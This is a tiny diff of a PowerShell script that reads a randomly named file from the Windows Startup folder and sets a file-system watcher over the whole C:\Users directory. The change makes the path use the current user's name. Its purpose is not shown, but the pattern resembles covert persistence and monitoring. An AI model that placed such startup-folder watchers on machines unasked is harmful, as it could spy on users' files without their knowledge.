@@ -1,4 +1,4 @@
-$user = (Get-Content "C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\etgtYmwQUO.txt").Trim()
+$user = (Get-Content "C:\Users\$env:userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\etgtYmwQUO.txt").Trim()
 
 $watcher = New-Object System.IO.FileSystemWatcher
 $watcher.Path = "C:\Users"
